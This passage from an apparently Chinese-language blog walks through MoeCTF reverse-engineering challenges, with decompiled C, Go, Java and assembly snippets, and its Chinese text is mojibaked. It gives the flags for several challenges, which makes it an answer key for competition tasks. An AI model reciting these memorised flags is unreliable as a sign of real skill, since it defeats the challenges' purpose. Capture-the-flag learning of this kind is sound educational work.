<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">NVXWKY3UMZ5XA4RTMMYG24DJNRUW4ZZNKB4WGX3DGRXF6MDQOQYW22L2MUWVG4BTGNSH2</span><span class="o">===</span>
</span></span></code></pre></div><p>æ ¹æ®æºä»£ç , è¿™æ˜¯ä¸€ä»½<code>base32</code>åŠ å¯†çš„ç©æ„å„¿, äºæ˜¯å†æ‰¾ä¸ªç½‘ç«™è§£å¯†å¾—åˆ°<code>flag</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">moectf<span class="o">{</span>pr3c0mpiling-Pyc_c4n_0pt1mize-Sp33d<span class="o">}</span>
</span></span></code></pre></div><h3 id="easy-shell">Easy Shell</h3>
<p>è¿™ä¸ªæˆ‘è¯´ä»€ä¹ˆå¥½å’§.. å°±æ˜¯ç™¾åº¦æ‰¾äº†ä¸ª<code>upx tool</code>,ç„¶åæŠŠé¢˜ä¸Šç»™çš„<code>exe</code>æ‰”äº†è¿›å», å†æŠŠåå‡ºæ¥çš„ä¸œè¥¿æ‰”è¿›<code>IDA</code>&hellip; å‘ç°è¿™ä¹ˆä¸€æ®µ:</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov     dword ptr [esp], offset aWelcomeToTheMo ; &#34;Welcome to the MoeCTF!&#34;
call    puts
mov     dword ptr [esp+11h], 63656F6Dh
mov     dword ptr [esp+15h], 757B6674h
mov     dword ptr [esp+19h], 315F7870h
mov     dword ptr [esp+1Dh], 5F615F73h
mov     dword ptr [esp+21h], 646E314Bh
mov     dword ptr [esp+25h], 5F46305Fh
mov     dword ptr [esp+29h], 31326873h
mov     word ptr [esp+2Dh], 7D4Ch
mov     byte ptr [esp+2Fh], 0
lea     eax, [esp+30h+var_1F]
</code></pre><p>çœ‹åˆ°é‚£ä¸ª<code>63 65 6F 6D</code>æˆ‘å°±æ˜ç™½äº†, å’Œ<code>IntroducingRE</code>ç›¸åŒè§£æ³•, å¾—åˆ°<code>flag</code>.</p>
<h3 id="easy-debugger">Easy Debugger</h3>
<p>è¿™é¢˜æ˜¯å‘Šè¯‰ä½ æ€ä¹ˆç”¨è°ƒè¯•å™¨çš„&hellip; æˆ‘æ‡’, å°±æ‰”è¿›<code>Visual Studio</code>å¼€äº†ä¸ªè°ƒè¯•, ç„¶å<code>flag</code>å°±è‡ªå·±è¹¦å‡ºæ¥äº†&hellip; æ²¡ä»€ä¹ˆæŠ€æœ¯å«é‡, å¯¹å§&hellip;</p>
<h3 id="easy-go">Easy Go</h3>
<p>ä»è¿™é¢˜å¼€å§‹, æˆ‘çŸ¥é“äº†, æ‰€æœ‰å†™ç€Easyçš„é¢˜, éƒ½æ˜¯éª—äººçš„ğŸ™‚ä¸€ç‚¹éƒ½ä¸Easy&hellip; å¯èƒ½æˆ‘èœæ˜¯å¾ˆå¤§çš„åŸå› å§â€¦â€¦</p>
<p>è¿˜æ˜¯ç›¸åŒçš„å¥—è·¯, ä¸‹è½½åæ‰”è¿›<code>IDA</code>, ç„¶åçœ‹è§äº†æµ©å¦‚çƒŸæµ·çš„å‡½æ•°&hellip; ( wocè¦ä¸è¦è¿™ä¹ˆåˆºæ¿€</p>
<p>è´¹å°½åƒè¾›ä¸‡è‹¦æ‰¾åˆ°äº†main_mainå‡½æ•°, æ‰“å¼€åçœ‹äº†çœ¼æ±‡ç¼–å‘ç°å¤´ç–¼, æœæ–­F5:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main_main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                             <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a4</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a5</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ä¸€å¤§å †å˜é‡å£°æ˜,èŠ‚çœç¯‡å¹…å°±ä¸çœ‹äº† */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="cm">/* å¯¹è§£é¢˜æ²¡ä»€ä¹ˆç”¨çš„å‡½æ•° */</span>
</span></span><span class="line"><span class="cl">  <span class="n">fmt_Fscanln</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v23</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4AAF60</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">v8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">go_itab__os_File_io_Reader</span><span class="p">,</span> <span class="n">os_Stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v19</span> <span class="o">==</span> <span class="mi">1107LL</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">runtime_convTstring</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">unk_4B0720</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">fmt_Fprintln</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="n">a1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">a2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">v12</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">go_itab__os_File_io_Writer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">v13</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">v14</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">go_itab__os_File_io_Writer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">os_Stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* åé¢ä¸€ä¸ªelseä¸€ä¸ªreturn,éƒ½ä¸æ˜¯é‡ç‚¹ */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¸€ä¸å°å¿ƒçœ‹åˆ°äº†ä»£ç é‡Œæœ‰ä¸€ä¸ª<code>Fscanln</code>, æƒ³ç€è¿™è‚¯å®šæ˜¯è¯»å–è¾“å…¥, å¾—äº†, åˆ†æä¸€ä¸‹, ä¸ç”¨å†æ‰¾<code>flag</code>äº†, ç„¶åå‘ç°<code>if</code>è¯­å¥é‡Œæ¯”è¾ƒäº†<code>v19</code>å’Œ<code>1107LL</code>, æœæ–­æ‰“å¼€é¢˜ç›®ç»™çš„<code>exe</code>, ç„¶åè¾“å…¥<code>1107</code>, æˆåŠŸæ‹¿åˆ°<code>flag</code>! <code>flag: moectf{G0_1Anguage_1s_1nT3r3st1ng}</code></p>
<h3 id="java-re">Java RE</h3>
<p>ç»™å¤§ä½¬é€’å’–å•¡~ è¯¶,åŠ³èµ„å’–å•¡å’§, å¥½åƒä¸¢äº†â€¦</p>
<p>è¿™é“é¢˜, ç”¨JD-GUIåç¼–è¯‘äº†ä¸€ä¸‹, å¾—åˆ°äº†ä¸€ä»½ç‹ é•¿çš„ä»£ç :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">qqq</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.awt.GridLayout</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.awt.event.ActionEvent</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.awt.event.ActionListener</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JButton</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JFrame</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JLabel</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JPanel</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JTextField</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Box</span> <span class="kd">implements</span> <span class="n">ActionListener</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ä¸€å †å˜é‡å£°æ˜ */</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">CHECK</span><span class="o">(</span><span class="kt">int</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">&gt;</span> <span class="n">10000000</span> <span class="o">&amp;&amp;</span> <span class="n">input</span> <span class="o">&lt;</span> <span class="n">99999999</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">v7</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">v8</span> <span class="o">=</span> <span class="n">10000000</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">v3</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">Math</span><span class="o">.</span><span class="na">abs</span><span class="o">(</span><span class="n">input</span> <span class="o">/</span> <span class="n">1000</span> <span class="o">%</span> <span class="n">100</span> <span class="o">-</span> <span class="n">80</span><span class="o">)</span> <span class="o">==</span> <span class="n">3</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">                <span class="n">input</span> <span class="o">%</span> <span class="n">1000</span> <span class="o">%</span> <span class="n">927</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">v5</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="o">(</span><span class="n">v5</span> <span class="o">&lt;</span> <span class="n">4</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">/</span> <span class="n">v7</span> <span class="o">%</span> <span class="n">10</span> <span class="o">!=</span> <span class="n">input</span> <span class="o">/</span> <span class="n">v8</span> <span class="o">%</span> <span class="n">10</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">v3</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                    <span class="n">v7</span> <span class="o">*=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="n">v8</span> <span class="o">/=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="n">v5</span><span class="o">++;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">v3</span> <span class="o">!=</span> <span class="n">1</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">v3</span> <span class="o">==</span> <span class="n">1</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">Box</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* UIè®¾ç½®, å¯¹é¢˜ç›®æ²¡ä»€ä¹ˆç”¨, ä¸ºçœç¯‡å¹…ä¸åˆ—å‡ºäº† */</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">actionPerformed</span><span class="o">(</span><span class="n">ActionEvent</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* ä¸€äº›åºŸè¯, ä¸€å †if, çœç¯‡å¹…å°±ä¸ç²˜è´´è¿›æ¥äº† */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getSource</span><span class="o">()</span> <span class="o">==</span> <span class="k">this</span><span class="o">.</span><span class="na">bt</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">CHECK</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="o">.</span><span class="na">tx</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">&#34;moectf{&#34;</span> <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span>
</span></span><span class="line"><span class="cl">                                                    <span class="n">1000000</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                        <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">10000</span> <span class="o">%</span> <span class="n">100</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                        <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">100</span> <span class="o">%</span> <span class="n">100</span><span class="o">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                                <span class="s">&#34;_he}&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="o">.</span><span class="na">tx</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">&#34;clear and try again!&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* å’Œè§£é¢˜æ— å…³çš„å¤„ç† */</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>æˆ‘æŠŠæºä»£ç ç²¾ç®€äº†ä¸€ä¸‹, ä»¥ä¾¿çœ‹å¾—æ›´æ¸…æ¥šç‚¹.</p>
<p>æ—¢ç„¶æ˜¯ä¸€ä¸ªGUIç¨‹åº, å¼€å§‹è¿è¡Œå½“ç„¶ä¸èƒ½æ‰¾<code>main</code>äº†.. æ³¨æ„åˆ°é¢˜é‡Œæœ‰ä¸ª<code>actionPerformed</code>, å¥½, å°±ä»è¿™ä¸ªå‡½æ•°å¼€å§‹å§.. ç„¶ååœ¨æœ€åé¢çœ‹è§äº†CHECK, å†è°ƒè½¬å¤´å»çœ‹CHECK, å‘ç°æ˜¯ä¸€ä¸ªæ£€æµ‹è¾“å…¥çš„å‡½æ•°.</p>
<p>æ ¹æ®<code>if (input &gt; 10000000 &amp;&amp; input &lt; 99999999)</code>çŸ¥é“è¾“å…¥æ˜¯ä¸€ä¸ªå…«ä½æ•°, æ¥ç€çœ‹<code>if (Math.abs(input / 1000 % 100 - 80) == 3 &amp;&amp; input % 1000 % 927 == 0)</code>çŸ¥é“äº†ä¸­é—´ä¸¤ä½æ˜¯83æˆ–è€…77 ( ç¬¬ä¸€æ¬¡åšçš„æ—¶å€™æ²¡çœ‹è§abså‡½æ•°,æµªè´¹äº†nä¹…æœ€åå‘ç°å·®ç‚¹æ°”å¾—æ‘”é”®ç›˜ ) æœ€å3ä½æ˜¯927.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">while</span> <span class="o">(</span><span class="n">v5</span> <span class="o">&lt;</span> <span class="n">4</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">/</span> <span class="n">v7</span> <span class="o">%</span> <span class="n">10</span> <span class="o">!=</span> <span class="n">input</span> <span class="o">/</span> <span class="n">v8</span> <span class="o">%</span> <span class="n">10</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">v3</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">*=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">/=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span><span class="o">++;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>è¿™ä¸ªå¾ªç¯æ˜¯ç”¨æ¥åˆ¤æ–­å›æ–‡æ•°å­—çš„, æˆ‘ä»¬å·²ç»çŸ¥é“äº†å…«ä½æ•°çš„åäº”ä½æ˜¯77927, å¯¹ç§°è¿‡å»å°±æ˜¯72977927.</p>
<p>ç„¶åå›åˆ°<code>actionPerformed</code>å‡½æ•°, å‘ç°è¿™ä¹ˆå‡ å¥:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span><span class="n">CHECK</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">tx</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">&#34;moectf{&#34;</span> <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">1000000</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">10000</span> <span class="o">%</span> <span class="n">100</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">100</span> <span class="o">%</span> <span class="n">100</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;_he}&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>è¿™ä¸ªæå–å‡ºæ¥äº†72977927çš„å‰å…­ä½72, 97, 79å¹¶ç”¨ASCIIè§£ç , ç„¶åæŠŠå­—ç¬¦ä¸²æ‹¼èµ·æ¥..</p>
<p>å‡ºäºæ‡’, å†™ä¸€å°ç¨‹åº, è§£ä¹‹:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">72</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">97</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">79</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;moectf{&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="n">c</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;_he}&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å’–å•¡çœŸå¥½å–~</p>
<h3 id="mine-sweep">Mine Sweep</h3>
<p>è¿™é“é¢˜æ²¡ä»€ä¹ˆå¥½è¯´çš„&hellip;æˆ‘æ‰«é›·é€šå…³äº†&hellip;çœŸé€†å‘çš„è¯, æˆ‘è¿˜æ²¡æœ‰è¯•è¿‡. ( é€ƒâ€¦</p>
<h3 id="easy-re">Easy RE</h3>
<p>æœ‰äº†å¯¹ä¸Šé¢çš„Easyçš„ä½“éªŒæˆ‘ä¸æ¯«ä¸æ•¢è§‰å¾—è¿™é¢˜ç‹ easy&hellip;æœä¸å…¶ç„¶, æ‰”è¿›<code>IDA</code>ä¹‹åæˆ‘ä¸€è„¸è’™åœˆ, è¿™æ˜¯ä¸ªä»€ä¹ˆç©æ„å„¿å•Š&hellip;</p>
<p>ä¸ç®¡äº†, æ‰¾åˆ°äº†<code>main</code>, ç„¶åF5, å¾—åˆ°ä»¥ä¸‹ä¸œä¸œ:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* å˜é‡å£°æ˜ */</span>
</span></span><span class="line"><span class="cl">  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_4011E0</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v10</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="mi">4194587627529708148LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mi">653654411009211005LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">4502494060534902393LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="mi">1048127506</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="mi">12340</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="mi">77</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_4040B0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_401270</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_4012A0</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å•Šå˜? è¿™ç”»é£æ€ä¹ˆè¿™ä¹ˆå¥‡æ€ª? æˆ‘çœ‹äº†çœ¼é¢˜ç›®æè¿°, å¾—, <code>AntiAntiDebug</code>æˆ‘ä¸€å‡†å„¿æ˜¯ä¸ä¼šäº†, é‚£å°±è§£ç å§&hellip;</p>
<p>é¡ºç€å‡½æ•°æ‰¾äº†å¥½ä¹…</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_401270</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">a1</span> <span class="o">=</span> <span class="mi">109</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_401240</span><span class="p">(</span><span class="n">byte_404080</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">5LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">sub_4012A0</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_40409F</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™æ˜¯<code>main</code>é‡Œé¢æåˆ°çš„ä¸¤ä¸ªå‡½æ•°, åˆ†åˆ«çœ‹äº†ä¸‹, ä¸€ä¸ªæŒ‡å‘<code>byte_404080</code>, ä¸€ä¸ªæŒ‡å‘<code>byte_40409F</code></p>
